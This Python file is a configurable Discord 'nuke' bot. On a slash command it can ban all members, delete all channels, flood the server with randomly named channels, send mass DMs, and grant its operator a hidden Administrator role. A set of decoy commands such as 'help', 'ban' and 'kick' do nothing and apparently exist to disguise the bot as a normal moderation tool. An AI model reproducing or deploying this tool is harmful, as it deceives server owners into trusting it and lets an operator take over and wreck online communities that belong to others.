import lightbulb
import hikari
import random

token = "token"  # your token

delete_channels = False  # set to "True" if you want to delete all channels
ban_members = False  # set to "True" if you want to ban all members
give_admin = True  # gives you admin
create_channels_count = 0  # set how many channels the bot will create. leave as 0 to disable
dm_members = ""  # your message here. leave blank to disable
bot_activity = ""  # bot activity text, leave blank to disable
your_nick = ""  # this nick won't be banned, format Name#0000, MANDATORY!!
command_name = ""  # command name, MANDATORY!!
command_description = ""  # command description, MANDATORY!!
cool_message = ""  # bot will send this message when nuking starts. leave blank for no message

# to start nuking run /"your command name"

bot = lightbulb.BotApp(
    token=token,
    intents=hikari.Intents.ALL_UNPRIVILEGED | hikari.Intents.GUILD_MEMBERS,
)


@bot.listen(hikari.StartedEvent)
async def on_start(event):
    print("""\
    
 $$$$$$\  $$$$$$$\  $$\                           
$$ ___$$\ $$  __$$\ \__|                          
\_/   $$ |$$ |  $$ |$$\ $$\   $$\ $$\   $$\       
  $$$$$ / $$$$$$$\ |$$ |\$$\ $$  |\$$\ $$  |      
  \___$$\ $$  __$$\ $$ | \$$$$  /  \$$$$  /       
$$\   $$ |$$ |  $$ |$$ | $$  $$<   $$  $$<        
\$$$$$$  |$$$$$$$  |$$ |$$  /\$$\ $$  /\$$\       
 \______/ \_______/ \__|\__/  \__|\__/  \__|      
                                               
    """)
    if bot_activity:
        await bot.update_presence(
            status=hikari.Status.ONLINE,
            activity=hikari.Activity(
                name=bot_activity,
                type=hikari.ActivityType.PLAYING,
            ),
        )


def generate_random_str():
    result = ""
    length = 100
    chars = "abcdefghijqlmnopqrstuvwxyz0123456789€|!▒█░æ¶§"
    for char in range(length):
        result += chars[random.randint(0, len(chars) - 1)]
    return result


if not cool_message:
    cool_message = "⠀"


@bot.command
@lightbulb.command(command_name, command_description)
@lightbulb.implements(lightbulb.SlashCommand)
async def generates_spam(ctx):
    await ctx.respond(cool_message)
    if ban_members:
        for member in await bot.rest.fetch_members(guild=ctx.get_guild()):
            try:
                if not your_nick:
                    await bot.rest.ban_member(guild=ctx.get_guild(), user=member)
            except:
                print(f"couldn't ban {member}")
    if delete_channels:
        for channel in await bot.rest.fetch_guild_channels(guild=ctx.get_guild()):
            await bot.rest.delete_channel(channel=channel)
    if create_channels_count != 0:
        for i in range(create_channels_count):
            await bot.rest.create_guild_text_channel(name=generate_random_str(), guild=ctx.get_guild())
    if dm_members:
        for member in await bot.rest.fetch_members(guild=ctx.get_guild()):
            try:
                await ctx.member.send(dm_members)
            except:
                print(f"couldn't send dm to {member}")
    if give_admin:
        try:
            await bot.rest.add_role_to_member(guild=ctx.get_guild(),user=ctx.member,
                                              role=await bot.rest.create_role(guild=ctx.get_guild(),
                                              name="⠀", permissions=hikari.Permissions.ADMINISTRATOR,color="#292b2f"))
        except:
            print("bot needs higher permissions to give you admin")


# fake commands (delete if not needed)
@bot.command
@lightbulb.command("help", "displays documentation")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command(ctx):
    ctx.respond("⠀")


@bot.command
@lightbulb.command("ban", "bans member")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command2(ctx):
    ctx.respond("⠀")


@bot.command
@lightbulb.command("mute", "mutes member")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command3(ctx):
    ctx.respond("⠀")


@bot.command
@lightbulb.command("info", "displays info about a member")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command4(ctx):
    ctx.respond("⠀")


@bot.command
@lightbulb.command("clear", "clears messages")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command5(ctx):
    ctx.respond("⠀")


@bot.command
@lightbulb.command("kick", "kicks member")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command6(ctx):
    ctx.respond("⠀")


@bot.command
@lightbulb.command("random", "generates a random number")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command7(ctx):
    ctx.respond("⠀")


@bot.command
@lightbulb.command("invite", "generates an invite")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command8(ctx):
    ctx.respond("⠀")


@bot.command
@lightbulb.command("setup", "setup command")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command9(ctx):
    ctx.respond("⠀")


@bot.command
@lightbulb.command("warn", "warn user")
@lightbulb.implements(lightbulb.SlashCommand)
async def fake_command10(ctx):
    ctx.respond("⠀")


bot.run()
